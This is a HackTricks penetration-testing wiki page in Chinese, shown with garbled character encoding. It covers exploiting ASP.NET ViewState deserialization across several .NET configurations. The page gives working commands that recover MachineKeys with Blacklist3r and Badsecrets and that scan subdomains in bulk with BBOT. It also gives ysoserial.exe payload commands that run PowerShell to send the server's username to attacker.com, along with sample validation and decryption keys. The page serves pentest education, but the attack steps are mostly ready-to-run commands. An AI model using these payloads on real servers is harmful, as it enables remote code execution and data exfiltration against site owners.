# åˆ©ç”¨ \_\_VIEWSTATE è€Œä¸çŸ¥å…¶ç§˜å¯†

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨** **Twitter** ğŸ¦ **ä¸Šå…³æ³¨æˆ‘ä»¬** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**æ¼æ´èµé‡‘æç¤º**ï¼š**æ³¨å†Œ** **Intigriti**ï¼Œä¸€ä¸ªç”±é»‘å®¢ä¸ºé»‘å®¢åˆ›å»ºçš„é«˜çº§ **æ¼æ´èµé‡‘å¹³å°**ï¼ä»Šå¤©å°±åŠ å…¥æˆ‘ä»¬ [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)ï¼Œå¼€å§‹èµšå–é«˜è¾¾ **$100,000** çš„èµé‡‘ï¼

{% embed url="https://go.intigriti.com/hacktricks" %}

## ä»€ä¹ˆæ˜¯ ViewState

**ViewState** æ˜¯ ASP.NET ä¸­ç”¨äºåœ¨ç½‘é¡µä¹‹é—´ä¿æŒé¡µé¢å’Œæ§ä»¶æ•°æ®çš„é»˜è®¤æœºåˆ¶ã€‚åœ¨æ¸²æŸ“é¡µé¢çš„ HTML æ—¶ï¼Œé¡µé¢çš„å½“å‰çŠ¶æ€å’Œåœ¨å›å‘æœŸé—´è¦ä¿ç•™çš„å€¼è¢«åºåˆ—åŒ–ä¸º base64 ç¼–ç çš„å­—ç¬¦ä¸²ã€‚è¿™äº›å­—ç¬¦ä¸²éšåè¢«æ”¾ç½®åœ¨éšè—çš„ ViewState å­—æ®µä¸­ã€‚

ViewState ä¿¡æ¯å¯ä»¥é€šè¿‡ä»¥ä¸‹å±æ€§æˆ–å…¶ç»„åˆæ¥è¡¨å¾ï¼š

* **Base64**ï¼š
* å½“ `EnableViewStateMac` å’Œ `ViewStateEncryptionMode` å±æ€§éƒ½è®¾ç½®ä¸º false æ—¶ä½¿ç”¨æ­¤æ ¼å¼ã€‚
* **Base64 + å¯ç”¨ MAC (æ¶ˆæ¯è®¤è¯ç )**ï¼š
* é€šè¿‡å°† `EnableViewStateMac` å±æ€§è®¾ç½®ä¸º true æ¥æ¿€æ´» MACã€‚è¿™ä¸º ViewState æ•°æ®æä¾›å®Œæ•´æ€§éªŒè¯ã€‚
* **Base64 + åŠ å¯†**ï¼š
* å½“ `ViewStateEncryptionMode` å±æ€§è®¾ç½®ä¸º true æ—¶åº”ç”¨åŠ å¯†ï¼Œä»¥ç¡®ä¿ ViewState æ•°æ®çš„æœºå¯†æ€§ã€‚

## æµ‹è¯•ç”¨ä¾‹

è¯¥å›¾åƒæ˜¯ä¸€ä¸ªè¡¨æ ¼ï¼Œè¯¦ç»†è¯´æ˜äº†åŸºäº .NET æ¡†æ¶ç‰ˆæœ¬çš„ ASP.NET ä¸­ ViewState çš„ä¸åŒé…ç½®ã€‚ä»¥ä¸‹æ˜¯å†…å®¹æ‘˜è¦ï¼š

1. å¯¹äº **ä»»ä½•ç‰ˆæœ¬çš„ .NET**ï¼Œå½“ MAC å’ŒåŠ å¯†éƒ½è¢«ç¦ç”¨æ—¶ï¼Œä¸éœ€è¦ MachineKeyï¼Œå› æ­¤æ²¡æœ‰é€‚ç”¨çš„æ–¹æ³•æ¥è¯†åˆ«å®ƒã€‚
2. å¯¹äº **4.5 ç‰ˆæœ¬ä»¥ä¸‹**ï¼Œå¦‚æœå¯ç”¨äº† MAC ä½†æœªå¯ç”¨åŠ å¯†ï¼Œåˆ™éœ€è¦ MachineKeyã€‚è¯†åˆ« MachineKey çš„æ–¹æ³•ç§°ä¸º "Blacklist3r"ã€‚
3. å¯¹äº **4.5 ç‰ˆæœ¬ä»¥ä¸‹**ï¼Œæ— è®º MAC æ˜¯å¦å¯ç”¨ï¼Œå¦‚æœå¯ç”¨äº†åŠ å¯†ï¼Œåˆ™éœ€è¦ MachineKeyã€‚è¯†åˆ« MachineKey æ˜¯ "Blacklist3r - æœªæ¥å¼€å‘" çš„ä»»åŠ¡ã€‚
4. å¯¹äº **4.5 ç‰ˆæœ¬åŠä»¥ä¸Š**ï¼Œæ‰€æœ‰ MAC å’ŒåŠ å¯†çš„ç»„åˆï¼ˆæ— è®ºä¸¤è€…éƒ½ä¸º trueï¼Œè¿˜æ˜¯ä¸€ä¸ªä¸º true å¦ä¸€ä¸ªä¸º falseï¼‰éƒ½éœ€è¦ MachineKeyã€‚å¯ä»¥ä½¿ç”¨ "Blacklist3r" è¯†åˆ« MachineKeyã€‚

### æµ‹è¯•ç”¨ä¾‹ï¼š1 â€“ EnableViewStateMac=false å’Œ viewStateEncryptionMode=false

è¿˜å¯ä»¥é€šè¿‡å°† `AspNetEnforceViewStateMac` æ³¨å†Œè¡¨é¡¹è®¾ç½®ä¸ºé›¶æ¥å®Œå…¨ç¦ç”¨ ViewStateMACï¼š
```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\v{VersionHere}
```
**è¯†åˆ« ViewState å±æ€§**

æ‚¨å¯ä»¥å°è¯•é€šè¿‡ä½¿ç”¨ BurpSuite æ•è·åŒ…å«æ­¤å‚æ•°çš„è¯·æ±‚æ¥è¯†åˆ« ViewState æ˜¯å¦å—åˆ° MAC ä¿æŠ¤ã€‚å¦‚æœæœªä½¿ç”¨ Mac ä¿æŠ¤è¯¥å‚æ•°ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net) è¿›è¡Œåˆ©ç”¨ã€‚
```
ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName"
```
### Test case 1.5 â€“ Like Test case 1 but the ViewState cookie isn't sent by the server

å¼€å‘äººå‘˜å¯ä»¥**ç§»é™¤ ViewState**ï¼Œä½¿å…¶ä¸æˆä¸º HTTP è¯·æ±‚çš„ä¸€éƒ¨åˆ†ï¼ˆç”¨æˆ·å°†ä¸ä¼šæ”¶åˆ°æ­¤ cookieï¼‰ã€‚\
äººä»¬å¯èƒ½ä¼šå‡è®¾ï¼Œå¦‚æœ**ViewState****ä¸å­˜åœ¨**ï¼Œä»–ä»¬çš„å®ç°å°±**å®‰å…¨**ï¼Œä¸ä¼šå‡ºç°ä¸ ViewState ååºåˆ—åŒ–ç›¸å…³çš„æ½œåœ¨æ¼æ´ã€‚\
ç„¶è€Œï¼Œäº‹å®å¹¶éå¦‚æ­¤ã€‚å¦‚æœæˆ‘ä»¬**å°† ViewState å‚æ•°**æ·»åŠ åˆ°è¯·æ±‚ä½“ä¸­ï¼Œå¹¶å‘é€æˆ‘ä»¬ä½¿ç”¨ ysoserial åˆ›å»ºçš„åºåˆ—åŒ–æœ‰æ•ˆè´Ÿè½½ï¼Œæˆ‘ä»¬ä»ç„¶èƒ½å¤Ÿå®ç°**ä»£ç æ‰§è¡Œ**ï¼Œå¦‚**æ¡ˆä¾‹ 1**æ‰€ç¤ºã€‚

### Test Case: 2 â€“ .Net < 4.5 and EnableViewStateMac=true & ViewStateEncryptionMode=false

ä¸ºäº†**å¯ç”¨ ViewState MAC**ï¼Œæˆ‘ä»¬éœ€è¦åœ¨ç‰¹å®šçš„ aspx æ–‡ä»¶ä¸Šè¿›è¡Œä»¥ä¸‹æ›´æ”¹ï¼š
```bash
<%@ Page Language="C#" AutoEventWireup="true" CodeFile="hello.aspx.cs" Inherits="hello" enableViewStateMac="True"%>
```
æˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡åœ¨ **web.config** æ–‡ä»¶ä¸­è®¾ç½®å®ƒæ¥å®ç° **æ•´ä½“** åº”ç”¨ç¨‹åºï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
<system.web>
<customErrors mode="Off" />
<machineKey validation="SHA1" validationKey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45" />
<pages enableViewStateMac="true" />
</system.web>
</configuration>
```
ç”±äºè¯¥å‚æ•°å—åˆ°MACä¿æŠ¤ï¼Œå› æ­¤è¦æˆåŠŸæ‰§è¡Œæ”»å‡»ï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦ä½¿ç”¨çš„å¯†é’¥ã€‚

æ‚¨å¯ä»¥å°è¯•ä½¿ç”¨ [**Blacklist3r(AspDotNetWrapper.exe)** ](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper) æ¥æŸ¥æ‰¾ä½¿ç”¨çš„å¯†é’¥ã€‚
```
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --decrypt --purpose=viewstate --modifier=6811C9FF --macdecode --TargetPagePath "/Savings-and-Investments/Application/ContactDetails.aspx" -f out.txt --IISDirPath="/"

--encrypteddata : __VIEWSTATE parameter value of the target application
--modifier : __VIWESTATEGENERATOR parameter value
```
[**Badsecrets**](https://github.com/blacklanternsecurity/badsecrets) æ˜¯å¦ä¸€ä¸ªå¯ä»¥è¯†åˆ«å·²çŸ¥ machineKeys çš„å·¥å…·ã€‚å®ƒæ˜¯ç”¨ Python ç¼–å†™çš„ï¼Œå› æ­¤ä¸ Blacklist3r ä¸åŒï¼Œæ²¡æœ‰ Windows ä¾èµ–ã€‚å¯¹äº .NET viewstatesï¼Œæœ‰ä¸€ä¸ª "python blacklist3r" å·¥å…·ï¼Œè¿™æ˜¯ä½¿ç”¨å®ƒçš„æœ€å¿«æ–¹æ³•ã€‚

å®ƒå¯ä»¥ç›´æ¥æä¾› viewstate å’Œ generatorï¼š
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --viewstate /wEPDwUJODExMDE5NzY5ZGQMKS6jehX5HkJgXxrPh09vumNTKQ== --generator EDD8C9AE
```
![https://user-images.githubusercontent.com/24899338/227034640-662b6aad-f8b9-49e4-9a6b-62a5f6ae2d60.png](https://user-images.githubusercontent.com/24899338/227034640-662b6aad-f8b9-49e4-9a6b-62a5f6ae2d60.png)

æˆ–è€…ï¼Œå®ƒå¯ä»¥ç›´æ¥è¿æ¥åˆ°ç›®æ ‡ URLï¼Œå¹¶å°è¯•ä» HTML ä¸­æå– viewstateï¼š
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --url http://vulnerablesite/vulnerablepage.aspx
```
![https://user-images.githubusercontent.com/24899338/227034654-e8ad9648-6c0e-47cb-a873-bf97623a0089.png](https://user-images.githubusercontent.com/24899338/227034654-e8ad9648-6c0e-47cb-a873-bf97623a0089.png)

ä¸ºäº†å¤§è§„æ¨¡æœç´¢æ˜“å—æ”»å‡»çš„ viewstateï¼Œç»“åˆå­åŸŸæšä¸¾ï¼Œå¯ä»¥ä½¿ç”¨ `badsecrets` [**BBOT**](exploiting-\_\_viewstate-parameter.md) æ¨¡å—ï¼š
```
bbot -f subdomain-enum -m badsecrets -t evil.corp
```
![https://user-images.githubusercontent.com/24899338/227028780-950d067a-4a01-481f-8e11-41fabed1943a.png](https://user-images.githubusercontent.com/24899338/227028780-950d067a-4a01-481f-8e11-41fabed1943a.png)

å¦‚æœä½ è¿æ°”å¥½å¹¶ä¸”æ‰¾åˆ°äº†å¯†é’¥ï¼Œä½ å¯ä»¥ä½¿ç”¨ [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)**:**
```
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --generator=CA0B0334 --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"

--generator = {__VIWESTATEGENERATOR parameter value}
```
åœ¨æœåŠ¡å™¨**æœªå‘é€**`_VIEWSTATEGENERATOR`å‚æ•°çš„æƒ…å†µä¸‹ï¼Œæ‚¨**ä¸éœ€è¦**æä¾›`--generator`å‚æ•°**è€Œæ˜¯è¿™äº›**ï¼š
```bash
--apppath="/" --path="/hello.aspx"
```
### Test Case: 3 â€“ .Net < 4.5 å’Œ EnableViewStateMac=true/false å’Œ ViewStateEncryptionMode=true

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä¸çŸ¥é“è¯¥å‚æ•°æ˜¯å¦å—åˆ°MACä¿æŠ¤ã€‚ç„¶åï¼Œå€¼å¯èƒ½è¢«åŠ å¯†ï¼Œæ‚¨å°†**éœ€è¦æœºå™¨å¯†é’¥æ¥åŠ å¯†æ‚¨çš„æœ‰æ•ˆè´Ÿè½½**ä»¥åˆ©ç”¨è¯¥æ¼æ´ã€‚

**åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ** [**Blacklist3r**](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper) **æ¨¡å—æ­£åœ¨å¼€å‘ä¸­...**

**åœ¨ .NET 4.5 ä¹‹å‰ï¼Œ** ASP.NET å¯ä»¥**æ¥å—**æ¥è‡ªç”¨æˆ·çš„**æœªåŠ å¯†** \_`__VIEWSTATE`\_ å‚æ•°ï¼Œå³ä½¿**`ViewStateEncryptionMode`**å·²è®¾ç½®ä¸º_**å§‹ç»ˆ**_ã€‚ASP.NET **ä»…æ£€æŸ¥**è¯·æ±‚ä¸­**`__VIEWSTATEENCRYPTED`**å‚æ•°çš„**å­˜åœ¨**ã€‚**å¦‚æœåˆ é™¤æ­¤å‚æ•°å¹¶å‘é€æœªåŠ å¯†çš„æœ‰æ•ˆè´Ÿè½½ï¼Œå®ƒä»ç„¶ä¼šè¢«å¤„ç†ã€‚**

å› æ­¤ï¼Œå¦‚æœæ”»å‡»è€…é€šè¿‡å…¶ä»–æ¼æ´ï¼ˆå¦‚æ–‡ä»¶éå†ï¼‰æ‰¾åˆ°è·å–æœºå™¨å¯†é’¥çš„æ–¹æ³•ï¼Œå¯ä»¥ä½¿ç”¨**æ¡ˆä¾‹ 2**ä¸­ä½¿ç”¨çš„[**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)å‘½ä»¤ï¼Œé€šè¿‡ViewStateååºåˆ—åŒ–æ¼æ´æ‰§è¡ŒRCEã€‚

* ä»è¯·æ±‚ä¸­åˆ é™¤`__VIEWSTATEENCRYPTED`å‚æ•°ï¼Œä»¥åˆ©ç”¨ViewStateååºåˆ—åŒ–æ¼æ´ï¼Œå¦åˆ™å°†è¿”å›Viewstate MACéªŒè¯é”™è¯¯ï¼Œåˆ©ç”¨å°†å¤±è´¥ã€‚

### Test Case: 4 â€“ .Net >= 4.5 å’Œ EnableViewStateMac=true/false å’Œ ViewStateEncryptionMode=true/falseï¼Œé™¤äº†ä¸¤ä¸ªå±æ€§ä¸ºfalse

æˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨web.configæ–‡ä»¶ä¸­æŒ‡å®šä»¥ä¸‹å‚æ•°æ¥å¼ºåˆ¶ä½¿ç”¨ASP.NETæ¡†æ¶ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚
```xml
<httpRuntime targetFramework="4.5" />
```
æˆ–è€…ï¼Œå¯ä»¥é€šè¿‡åœ¨ web.config æ–‡ä»¶çš„ `machineKey` å‚æ•°ä¸­æŒ‡å®šä»¥ä¸‹é€‰é¡¹æ¥å®Œæˆæ­¤æ“ä½œã€‚
```bash
compatibilityMode="Framework45"
```
å¦‚å‰æ‰€è¿°ï¼Œ**å€¼æ˜¯åŠ å¯†çš„ã€‚** ç„¶åï¼Œè¦å‘é€**æœ‰æ•ˆçš„æœ‰æ•ˆè´Ÿè½½ï¼Œæ”»å‡»è€…éœ€è¦å¯†é’¥**ã€‚

æ‚¨å¯ä»¥å°è¯•ä½¿ç”¨ [**Blacklist3r(AspDotNetWrapper.exe)** ](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper)æ¥æŸ¥æ‰¾æ­£åœ¨ä½¿ç”¨çš„å¯†é’¥ï¼š
```
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata bcZW2sn9CbYxU47LwhBs1fyLvTQu6BktfcwTicOfagaKXho90yGLlA0HrdGOH6x/SUsjRGY0CCpvgM2uR3ba1s6humGhHFyr/gz+EP0fbrlBEAFOrq5S8vMknE/ZQ/8NNyWLwg== --decrypt --purpose=viewstate  --valalgo=sha1 --decalgo=aes --IISDirPath "/" --TargetPagePath "/Content/default.aspx"

--encrypteddata = {__VIEWSTATE parameter value}
--IISDirPath = {Directory path of website in IIS}
--TargetPagePath = {Target page path in application}
```
å¯¹äºIISDirPathå’ŒTargetPagePathçš„æ›´è¯¦ç»†æè¿° [refer here](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)

æˆ–è€…ï¼Œä½¿ç”¨ [**Badsecrets**](https://github.com/blacklanternsecurity/badsecrets)ï¼ˆå¸¦ç”Ÿæˆå™¨å€¼ï¼‰ï¼š
```bash
cd badsecrets
python examples/blacklist3r.py --viewstate JLFYOOegbdXmPjQou22oT2IxUwCAzSA9EAxD6+305e/4MQG7G1v5GI3wL7D94W2OGpVGrI2LCqEwDoS/8JkE0rR4ak0= --generator B2774415
```
![https://user-images.githubusercontent.com/24899338/227043316-13f0488f-5326-46cc-9604-404b908ebd7b.png](https://user-images.githubusercontent.com/24899338/227043316-13f0488f-5326-46cc-9604-404b908ebd7b.png)

ä¸€æ—¦è¯†åˆ«å‡ºæœ‰æ•ˆçš„æœºå™¨å¯†é’¥ï¼Œ**ä¸‹ä¸€æ­¥æ˜¯ä½¿ç”¨** [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net) **ç”Ÿæˆåºåˆ—åŒ–æœ‰æ•ˆè´Ÿè½½**
```
ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --path="/content/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="F6722806843145965513817CEBDECBB1F94808E4A6C0B2F2"  --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"
```
å¦‚æœä½ æœ‰`__VIEWSTATEGENERATOR`çš„å€¼ï¼Œä½ å¯ä»¥å°è¯•ä½¿ç”¨`--generator`å‚æ•°å¹¶çœç•¥`--path`å’Œ`--apppath`å‚æ•°ã€‚

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/4.2.png)

æˆåŠŸåˆ©ç”¨ViewStateååºåˆ—åŒ–æ¼æ´å°†å¯¼è‡´å‘æ”»å‡»è€…æ§åˆ¶çš„æœåŠ¡å™¨å‘å‡ºå¸¦æœ‰ç”¨æˆ·åçš„å¸¦å¤–è¯·æ±‚ã€‚è¿™ç§åˆ©ç”¨æ–¹å¼åœ¨ä¸€ä¸ªåä¸ºâ€œä½¿ç”¨Blacklist3rå’ŒYsoSerial.NETåˆ©ç”¨ViewStateååºåˆ—åŒ–â€çš„æ¦‚å¿µéªŒè¯ï¼ˆPoCï¼‰ä¸­å¾—åˆ°äº†å±•ç¤ºã€‚æœ‰å…³åˆ©ç”¨è¿‡ç¨‹å¦‚ä½•å·¥ä½œçš„æ›´å¤šç»†èŠ‚ï¼Œä»¥åŠå¦‚ä½•ä½¿ç”¨åƒBlacklist3rè¿™æ ·çš„å·¥å…·æ¥è¯†åˆ«MachineKeyï¼Œä½ å¯ä»¥æŸ¥çœ‹æä¾›çš„[æˆåŠŸåˆ©ç”¨çš„PoC](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/#PoC)ã€‚

### æµ‹è¯•ç”¨ä¾‹ 6 â€“ ä½¿ç”¨äº†ViewStateUserKeys

**ViewStateUserKey**å±æ€§å¯ä»¥ç”¨æ¥**é˜²å¾¡****CSRFæ”»å‡»**ã€‚å¦‚æœåœ¨åº”ç”¨ç¨‹åºä¸­å®šä¹‰äº†è¿™æ ·çš„å¯†é’¥ï¼Œå¹¶ä¸”æˆ‘ä»¬å°è¯•ä½¿ç”¨åˆ°ç›®å‰ä¸ºæ­¢è®¨è®ºçš„æ–¹æ³•ç”Ÿæˆ**ViewState**æœ‰æ•ˆè´Ÿè½½ï¼Œ**æœ‰æ•ˆè´Ÿè½½å°†ä¸ä¼šè¢«åº”ç”¨ç¨‹åºå¤„ç†**ã€‚\
ä½ éœ€è¦ä½¿ç”¨ä¸€ä¸ªé¢å¤–çš„å‚æ•°æ¥æ­£ç¡®åˆ›å»ºæœ‰æ•ˆè´Ÿè½½ï¼š
```bash
--viewstateuserkey="randomstringdefinedintheserver"
```
### æˆåŠŸåˆ©ç”¨çš„ç»“æœ <a href="#poc" id="poc"></a>

å¯¹äºæ‰€æœ‰æµ‹è¯•ç”¨ä¾‹ï¼Œå¦‚æœ ViewState YSoSerial.Net è´Ÿè½½ **æˆåŠŸ** å·¥ä½œï¼Œåˆ™æœåŠ¡å™¨å“åº”â€œ**500 å†…éƒ¨æœåŠ¡å™¨é”™è¯¯**â€ï¼Œå“åº”å†…å®¹ä¸ºâ€œ**è¯¥é¡µé¢çš„çŠ¶æ€ä¿¡æ¯æ— æ•ˆï¼Œå¯èƒ½å·²æŸå**â€ï¼Œå¹¶ä¸”æˆ‘ä»¬è·å¾— OOB è¯·æ±‚ã€‚

æŸ¥çœ‹ [è¿›ä¸€æ­¥ä¿¡æ¯åœ¨è¿™é‡Œ](https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/deserialization/\[\*\*https:/www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/\*\*]\(https:/www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/\)/README.md)

## å‚è€ƒæ–‡çŒ®

* [**https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/**](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/)
* [**https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817**](https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817)\\
* [**https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/**](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)
* [**https://blog.blacklanternsecurity.com/p/introducing-badsecrets**](https://blog.blacklanternsecurity.com/p/introducing-badsecrets)

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**æ¼æ´èµé‡‘æç¤º**ï¼š**æ³¨å†Œ** **Intigriti**ï¼Œä¸€ä¸ªç”±é»‘å®¢ä¸ºé»‘å®¢åˆ›å»ºçš„é«˜çº§ **æ¼æ´èµé‡‘å¹³å°**ï¼ä»Šå¤©å°±åŠ å…¥æˆ‘ä»¬ [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)ï¼Œå¼€å§‹èµšå–é«˜è¾¾ **$100,000** çš„èµé‡‘ï¼

{% embed url="https://go.intigriti.com/hacktricks" %}

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æ”»å‡»ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æ”»å‡»ï¼š <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨ Twitter ä¸Šå…³æ³¨** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
